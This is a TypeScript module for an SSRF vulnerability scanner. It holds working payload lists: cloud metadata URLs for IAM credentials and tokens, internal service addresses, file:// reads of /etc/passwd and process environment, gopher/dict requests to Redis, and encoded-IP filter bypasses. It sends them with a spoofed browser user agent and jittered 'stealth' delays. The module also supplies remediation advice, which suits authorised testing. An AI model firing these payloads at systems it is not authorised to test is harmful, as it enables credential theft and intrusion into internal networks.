// =============================================================================
// VulnHunter AI - SSRF (Server-Side Request Forgery) Scanner Module
// =============================================================================
// Detects SSRF vulnerabilities by probing URL-accepting parameters with cloud
// metadata endpoints, internal IPs, protocol handlers, and bypass techniques.
// CWE-918 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (8.6 base)
// =============================================================================

import {
  type Finding,
  type Vulnerability,
  Severity,
  VulnerabilityCategory,
} from "@vulnhunter/core";
import { generateUUID } from "@vulnhunter/core";
import { sendRequest, type HttpResponse } from "@vulnhunter/core";
import { createLogger } from "@vulnhunter/core";
import { RateLimiter } from "@vulnhunter/core";

import type { ScanModule } from "./xss.js";

const log = createLogger("scanner:ssrf");

// ---------------------------------------------------------------------------
// Cloud Metadata Endpoints
// ---------------------------------------------------------------------------

const CLOUD_METADATA_ENDPOINTS: Array<{
  provider: string;
  url: string;
  headers?: Record<string, string>;
  indicator: string;
}> = [
  // AWS IMDSv1
  {
    provider: "AWS",
    url: "http://169.254.169.254/latest/meta-data/",
    indicator: "ami-id",
  },
  {
    provider: "AWS",
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    indicator: "AccessKeyId",
  },
  {
    provider: "AWS",
    url: "http://169.254.169.254/latest/user-data/",
    indicator: "",
  },
  // AWS IMDSv2 (requires token but SSRF may still reach it if app follows redirects)
  {
    provider: "AWS IMDSv2",
    url: "http://169.254.169.254/latest/api/token",
    headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
    indicator: "",
  },
  // GCP
  {
    provider: "GCP",
    url: "http://metadata.google.internal/computeMetadata/v1/",
    headers: { "Metadata-Flavor": "Google" },
    indicator: "project",
  },
  {
    provider: "GCP",
    url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    headers: { "Metadata-Flavor": "Google" },
    indicator: "access_token",
  },
  // Azure
  {
    provider: "Azure",
    url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    headers: { Metadata: "true" },
    indicator: "compute",
  },
  {
    provider: "Azure",
    url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    headers: { Metadata: "true" },
    indicator: "access_token",
  },
  // DigitalOcean
  {
    provider: "DigitalOcean",
    url: "http://169.254.169.254/metadata/v1/",
    indicator: "droplet_id",
  },
  // Alibaba Cloud
  {
    provider: "Alibaba",
    url: "http://100.100.100.200/latest/meta-data/",
    indicator: "instance-id",
  },
  // Oracle Cloud
  {
    provider: "Oracle",
    url: "http://169.254.169.254/opc/v2/instance/",
    indicator: "availabilityDomain",
  },
  // Kubernetes
  {
    provider: "Kubernetes",
    url: "https://kubernetes.default.svc/api/v1/namespaces",
    indicator: "items",
  },
];

// ---------------------------------------------------------------------------
// Internal/localhost targets
// ---------------------------------------------------------------------------

const INTERNAL_TARGETS: Array<{ url: string; description: string }> = [
  { url: "http://127.0.0.1/", description: "IPv4 localhost" },
  { url: "http://localhost/", description: "localhost hostname" },
  { url: "http://[::1]/", description: "IPv6 localhost" },
  { url: "http://0.0.0.0/", description: "Zero address" },
  { url: "http://127.1/", description: "Shorthand localhost" },
  { url: "http://127.0.0.1:80/", description: "localhost:80" },
  { url: "http://127.0.0.1:443/", description: "localhost:443" },
  { url: "http://127.0.0.1:8080/", description: "localhost:8080" },
  { url: "http://127.0.0.1:8443/", description: "localhost:8443" },
  { url: "http://127.0.0.1:3000/", description: "localhost:3000" },
  { url: "http://127.0.0.1:9200/", description: "Elasticsearch" },
  { url: "http://127.0.0.1:6379/", description: "Redis" },
  { url: "http://127.0.0.1:5432/", description: "PostgreSQL" },
  { url: "http://127.0.0.1:27017/", description: "MongoDB" },
  { url: "http://127.0.0.1:11211/", description: "Memcached" },
  { url: "http://10.0.0.1/", description: "10.x private range" },
  { url: "http://172.16.0.1/", description: "172.16.x private range" },
  { url: "http://192.168.0.1/", description: "192.168.x private range" },
  { url: "http://192.168.1.1/", description: "Common router/gateway" },
];

// ---------------------------------------------------------------------------
// Protocol handler payloads
// ---------------------------------------------------------------------------

const PROTOCOL_PAYLOADS: Array<{ payload: string; description: string }> = [
  { payload: "file:///etc/passwd", description: "Local file read (Unix)" },
  { payload: "file:///etc/hostname", description: "Hostname disclosure (Unix)" },
  { payload: "file:///etc/hosts", description: "Hosts file (Unix)" },
  { payload: "file:///proc/self/environ", description: "Environment variables" },
  { payload: "file:///proc/self/cmdline", description: "Process command line" },
  { payload: "file:///C:/Windows/win.ini", description: "Local file read (Windows)" },
  { payload: "file:///C:/Windows/System32/drivers/etc/hosts", description: "Hosts file (Windows)" },
  { payload: "gopher://127.0.0.1:6379/_INFO%0d%0a", description: "Redis via Gopher" },
  { payload: "dict://127.0.0.1:6379/INFO", description: "Redis via DICT" },
  { payload: "ftp://127.0.0.1/", description: "FTP localhost" },
  { payload: "ldap://127.0.0.1/", description: "LDAP localhost" },
  { payload: "tftp://127.0.0.1/test", description: "TFTP localhost" },
];

// ---------------------------------------------------------------------------
// IP bypass techniques (alternative representations of 127.0.0.1)
// ---------------------------------------------------------------------------

const IP_BYPASS_PAYLOADS: string[] = [
  // Decimal representation
  "http://2130706433/",
  // Hex representation
  "http://0x7f000001/",
  // Octal representation
  "http://0177.0.0.1/",
  // Mixed notation
  "http://127.0.0.01/",
  "http://127.0.01/",
  // IPv6 mapped IPv4
  "http://[::ffff:127.0.0.1]/",
  "http://[0:0:0:0:0:ffff:127.0.0.1]/",
  // URL encoding
  "http://%31%32%37%2e%30%2e%30%2e%31/",
  // Double URL encoding
  "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/",
  // IPv6 shorthand
  "http://[::1]/",
  "http://[0000::1]/",
  // Rare notations
  "http://127.1/",
  "http://127.0.1/",
  // Domain-based bypasses
  "http://localtest.me/",
  "http://127.0.0.1.nip.io/",
  "http://spoofed.burpcollaborator.net/",
  // With credentials
  "http://foo@127.0.0.1/",
  // Redirect via open redirect on target
  "http://127.0.0.1#@target.com/",
  // Backslash trick
  "http://127.0.0.1\\@target.com/",
];

// ---------------------------------------------------------------------------
// Common URL-accepting parameter names
// ---------------------------------------------------------------------------

const URL_PARAM_NAMES: string[] = [
  "url",
  "uri",
  "link",
  "src",
  "source",
  "href",
  "redirect",
  "redirect_url",
  "redirect_uri",
  "return",
  "return_url",
  "next",
  "next_url",
  "callback",
  "callback_url",
  "target",
  "dest",
  "destination",
  "go",
  "goto",
  "to",
  "out",
  "continue",
  "image",
  "image_url",
  "img",
  "img_url",
  "load",
  "fetch",
  "feed",
  "host",
  "site",
  "html",
  "page",
  "proxy",
  "preview",
  "view",
  "path",
  "file",
  "document",
  "folder",
  "root",
  "pdf",
  "download",
  "upload",
  "api",
  "endpoint",
  "service",
  "domain",
  "webhook",
];

// ---------------------------------------------------------------------------
// Internal service indicators
// ---------------------------------------------------------------------------

const INTERNAL_INDICATORS: RegExp[] = [
  /root:.*:0:0/i, // /etc/passwd
  /\[boot loader\]/i, // win.ini
  /ami-id/i, // AWS metadata
  /instance-id/i, // Cloud metadata
  /access_token/i, // OAuth tokens
  /AccessKeyId/i, // AWS credentials
  /SecretAccessKey/i, // AWS credentials
  /availabilityDomain/i, // Oracle Cloud
  /compute.*vmId/i, // Azure metadata
  /project.*numeric/i, // GCP metadata
  /redis_version/i, // Redis INFO
  /MongoDB/i, // MongoDB response
  /droplet_id/i, // DigitalOcean
  /"kind"\s*:\s*"NamespaceList"/i, // Kubernetes
];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function stealthDelay(baseMs: number): Promise<void> {
  const jitter = Math.floor(Math.random() * baseMs * 0.5);
  return new Promise((resolve) => setTimeout(resolve, baseMs + jitter));
}

function extractParams(urlStr: string): Map<string, string> {
  const params = new Map<string, string>();
  try {
    const url = new URL(urlStr);
    url.searchParams.forEach((v, k) => params.set(k, v));
  } catch {
    // Skip
  }
  return params;
}

function matchesInternalIndicator(body: string): string | null {
  for (const pattern of INTERNAL_INDICATORS) {
    const m = pattern.exec(body);
    if (m) return m[0];
  }
  return null;
}

function buildSsrfFinding(params: {
  target: string;
  endpoint: string;
  method: string;
  parameter: string;
  payload: string;
  ssrfType: string;
  confidence: number;
  evidence: string;
  responseBody: string;
  responseStatus: number;
  severity: Severity;
}): Finding {
  const vulnId = generateUUID();
  const cvssScore = params.severity === Severity.Critical ? 9.1 : params.severity === Severity.High ? 8.6 : 6.5;

  const vulnerability: Vulnerability = {
    id: vulnId,
    title: `${params.ssrfType} SSRF via "${params.parameter}" parameter`,
    description:
      `A Server-Side Request Forgery (SSRF) vulnerability was detected in the ` +
      `"${params.parameter}" parameter at ${params.endpoint}. ` +
      `The server-side application can be induced to make HTTP requests to an arbitrary ` +
      `domain or internal resource specified by the attacker. This can lead to unauthorized ` +
      `access to internal services, cloud metadata exfiltration, or further exploitation ` +
      `of internal network services.`,
    severity: params.severity,
    category: VulnerabilityCategory.SSRF,
    cvssScore,
    cvssVector:
      params.severity === Severity.Critical
        ? "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"
        : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    cweId: "CWE-918",
    target: params.target,
    endpoint: params.endpoint,
    evidence: {
      description: params.evidence,
      payload: params.payload,
      matchedPattern: params.evidence,
      extra: { ssrfType: params.ssrfType },
    },
    request: {
      method: params.method,
      url: params.endpoint,
      headers: {},
    },
    response: {
      statusCode: params.responseStatus,
      headers: {},
      body: params.responseBody.slice(0, 2000),
      responseTimeMs: 0,
    },
    remediation:
      "1. Implement an allowlist of permitted domains and IP ranges for outbound requests.\n" +
      "2. Block requests to private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x).\n" +
      "3. Disable unnecessary URL schemes (file://, gopher://, dict://, ftp://).\n" +
      "4. Use IMDSv2 with hop limit of 1 on AWS to prevent metadata access from SSRF.\n" +
      "5. Validate and sanitize user-supplied URLs on the server side.\n" +
      "6. Do not expose raw response bodies from server-side requests to users.\n" +
      "7. Use network-level segmentation to limit what the application server can reach.",
    references: [
      "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
      "https://portswigger.net/web-security/ssrf",
      "https://cwe.mitre.org/data/definitions/918.html",
      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
    ],
    confirmed: params.confidence >= 80,
    falsePositive: false,
    discoveredAt: new Date().toISOString(),
  };

  return {
    vulnerability,
    module: `scanner:ssrf:${params.ssrfType.toLowerCase().replace(/[- /]/g, "_")}`,
    confidence: params.confidence,
    timestamp: new Date().toISOString(),
    rawData: {
      payload: params.payload,
      ssrfType: params.ssrfType,
      parameter: params.parameter,
    },
  };
}

// ---------------------------------------------------------------------------
// SsrfScanner Class
// ---------------------------------------------------------------------------

export class SsrfScanner implements ScanModule {
  public readonly name = "ssrf";

  private rateLimiter: RateLimiter;
  private userAgent: string;

  constructor() {
    this.rateLimiter = new RateLimiter(5);
    this.userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
  }

  async *execute(
    target: string,
    options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    log.info({ target }, "Starting SSRF scan");

    const rateLimit = typeof options.rateLimit === "number" ? options.rateLimit : 5;
    this.rateLimiter = new RateLimiter(rateLimit);
    if (typeof options.userAgent === "string") {
      this.userAgent = options.userAgent;
    }

    // Identify URL-accepting parameters
    const urlParams = await this.identifyUrlParams(target);

    for (const paramName of urlParams) {
      // Phase 1: Cloud metadata probing
      yield* this.scanCloudMetadata(target, paramName);

      // Phase 2: Internal service probing
      yield* this.scanInternalServices(target, paramName);

      // Phase 3: Protocol handler testing
      yield* this.scanProtocolHandlers(target, paramName);

      // Phase 4: IP bypass techniques
      yield* this.scanIpBypasses(target, paramName);
    }

    log.info({ target }, "SSRF scan complete");
  }

  // -------------------------------------------------------------------------
  // Identify URL-accepting parameters
  // -------------------------------------------------------------------------

  private async identifyUrlParams(target: string): Promise<string[]> {
    const found: string[] = [];
    const existingParams = extractParams(target);

    // Check existing parameters
    for (const [key, value] of existingParams) {
      // If the value looks like a URL or contains URL-like content
      if (
        value.startsWith("http") ||
        value.startsWith("//") ||
        URL_PARAM_NAMES.includes(key.toLowerCase())
      ) {
        found.push(key);
      }
    }

    // Probe common URL parameter names
    for (const paramName of URL_PARAM_NAMES) {
      if (found.includes(paramName)) continue;

      const probeUrl = new URL(target);
      probeUrl.searchParams.set(paramName, "http://example.com");

      await this.rateLimiter.acquire();
      try {
        const resp = await sendRequest({
          method: "GET",
          url: probeUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        // Compare with a non-URL value to see if the app behaves differently
        const probeUrl2 = new URL(target);
        probeUrl2.searchParams.set(paramName, "not_a_url");
        await this.rateLimiter.acquire();
        const resp2 = await sendRequest({
          method: "GET",
          url: probeUrl2.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        // If responses differ significantly or first request fetched remote content
        if (
          Math.abs(resp.body.length - resp2.body.length) > 200 ||
          resp.status !== resp2.status ||
          resp.body.includes("Example Domain")
        ) {
          found.push(paramName);
        }
      } catch {
        // Skip
      }
      await stealthDelay(100);

      // Limit discovery to first 10 found
      if (found.length >= 10) break;
    }

    return found;
  }

  // -------------------------------------------------------------------------
  // Phase 1: Cloud metadata probing
  // -------------------------------------------------------------------------

  private async *scanCloudMetadata(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    for (const meta of CLOUD_METADATA_ENDPOINTS) {
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, meta.url);

      await this.rateLimiter.acquire();
      await stealthDelay(200);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "*/*" },
        });

        const indicator = matchesInternalIndicator(resp.body);
        const hasSpecificIndicator =
          meta.indicator && resp.body.includes(meta.indicator);

        if (indicator || hasSpecificIndicator) {
          const evidenceStr = indicator || meta.indicator;
          yield buildSsrfFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload: meta.url,
            ssrfType: `Cloud Metadata (${meta.provider})`,
            confidence: 95,
            evidence: `Cloud metadata from ${meta.provider} accessed. Indicator found: "${evidenceStr}"`,
            responseBody: resp.body,
            responseStatus: resp.status,
            severity: Severity.Critical,
          });
          return; // One metadata finding per param is critical enough
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 2: Internal service probing
  // -------------------------------------------------------------------------

  private async *scanInternalServices(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    // First get baseline response for comparison
    await this.rateLimiter.acquire();
    let baselineResp: HttpResponse | null = null;
    try {
      const baseUrl = new URL(target);
      baseUrl.searchParams.set(paramName, "http://invalid.hostname.test/");
      baselineResp = await sendRequest({
        method: "GET",
        url: baseUrl.toString(),
        headers: { "User-Agent": this.userAgent, Accept: "*/*" },
      });
    } catch {
      // OK
    }

    for (const internal of INTERNAL_TARGETS) {
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, internal.url);

      await this.rateLimiter.acquire();
      await stealthDelay(150);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "*/*" },
        });

        // Check for internal indicators
        const indicator = matchesInternalIndicator(resp.body);
        if (indicator) {
          yield buildSsrfFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload: internal.url,
            ssrfType: `Internal Service (${internal.description})`,
            confidence: 90,
            evidence: `Internal service accessed: ${internal.description}. Content indicator: "${indicator}"`,
            responseBody: resp.body,
            responseStatus: resp.status,
            severity: Severity.High,
          });
          continue;
        }

        // Compare with baseline -- if response is significantly different, it may be a hit
        if (
          baselineResp &&
          resp.status === 200 &&
          Math.abs(resp.body.length - baselineResp.body.length) > 500 &&
          resp.body.length > 100
        ) {
          yield buildSsrfFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload: internal.url,
            ssrfType: `Internal Service (${internal.description})`,
            confidence: 55,
            evidence:
              `Response differs significantly from baseline when accessing ${internal.description}. ` +
              `Response size: ${resp.body.length} bytes vs baseline: ${baselineResp.body.length} bytes.`,
            responseBody: resp.body,
            responseStatus: resp.status,
            severity: Severity.Medium,
          });
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 3: Protocol handler testing
  // -------------------------------------------------------------------------

  private async *scanProtocolHandlers(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    for (const proto of PROTOCOL_PAYLOADS) {
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, proto.payload);

      await this.rateLimiter.acquire();
      await stealthDelay(200);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "*/*" },
        });

        const indicator = matchesInternalIndicator(resp.body);
        if (indicator) {
          const severity = proto.payload.startsWith("file://")
            ? Severity.High
            : Severity.Critical;

          yield buildSsrfFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload: proto.payload,
            ssrfType: `Protocol Handler (${proto.description})`,
            confidence: 90,
            evidence: `Protocol handler "${proto.payload}" returned internal content: "${indicator}"`,
            responseBody: resp.body,
            responseStatus: resp.status,
            severity,
          });
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 4: IP bypass techniques
  // -------------------------------------------------------------------------

  private async *scanIpBypasses(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    // First check if standard localhost is blocked
    const stdUrl = new URL(target);
    stdUrl.searchParams.set(paramName, "http://127.0.0.1/");

    await this.rateLimiter.acquire();
    let stdResp: HttpResponse | null = null;
    try {
      stdResp = await sendRequest({
        method: "GET",
        url: stdUrl.toString(),
        headers: { "User-Agent": this.userAgent, Accept: "*/*" },
      });
    } catch {
      // Skip
    }

    const stdBlocked =
      !stdResp ||
      stdResp.body.toLowerCase().includes("blocked") ||
      stdResp.body.toLowerCase().includes("forbidden") ||
      stdResp.body.toLowerCase().includes("not allowed") ||
      stdResp.status === 403;

    for (const bypassUrl of IP_BYPASS_PAYLOADS) {
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, bypassUrl);

      await this.rateLimiter.acquire();
      await stealthDelay(200);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "*/*" },
        });

        const indicator = matchesInternalIndicator(resp.body);
        if (indicator) {
          yield buildSsrfFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload: bypassUrl,
            ssrfType: stdBlocked ? "SSRF Filter Bypass" : "Internal Access",
            confidence: stdBlocked ? 90 : 80,
            evidence:
              (stdBlocked
                ? `Standard localhost was blocked but bypass "${bypassUrl}" succeeded. `
                : `Internal access via "${bypassUrl}" succeeded. `) +
              `Content indicator: "${indicator}"`,
            responseBody: resp.body,
            responseStatus: resp.status,
            severity: Severity.High,
          });
          break; // One bypass is enough to prove the point
        }

        // Even without indicators, if standard was blocked but bypass returns 200 with content
        if (
          stdBlocked &&
          resp.status === 200 &&
          resp.body.length > 100 &&
          (!stdResp || resp.body !== stdResp.body)
        ) {
          yield buildSsrfFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload: bypassUrl,
            ssrfType: "SSRF Filter Bypass",
            confidence: 60,
            evidence:
              `Standard localhost request was blocked (status ${stdResp?.status ?? "N/A"}) ` +
              `but bypass "${bypassUrl}" returned status ${resp.status} with ` +
              `${resp.body.length} bytes of content.`,
            responseBody: resp.body,
            responseStatus: resp.status,
            severity: Severity.Medium,
          });
        }
      } catch {
        continue;
      }
    }
  }
}
